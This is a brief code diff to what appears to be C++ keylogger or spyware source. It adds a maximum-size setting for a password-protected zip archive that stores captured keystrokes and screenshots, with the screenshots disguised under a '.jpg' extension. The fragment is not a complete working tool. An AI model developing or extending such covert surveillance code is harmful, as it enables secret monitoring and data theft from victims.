@@ -211,6 +211,7 @@ DWORD CMDExecute(std::string _command, bool _newWindow = true, bool _autoExit = 
 #define           ZIP_ARCHIVE_NAME          "YOUR_ZIP_NAME.zip"
 #define           ZIP_ARCHIVE_PASSWORD      "PASSWORD"  // Set NULL if you don't want to encrypt the zip archive with a password
 #define           ZIP_SS_CUSTOM_EXTENSION   ".jpg"      // This is the displayed extension of the screenshots in the zip archive
+#define           ZIP_MAX_SIZE              268435456   // Define the maximum size of the zip archive in bytes (default 256MB  [268435456 bytes])
 
 UINT16            _G_KB_SAME_PREV_KEY_CNT;
 UINT16            _G_KB_KEYSTROKES_CNT;
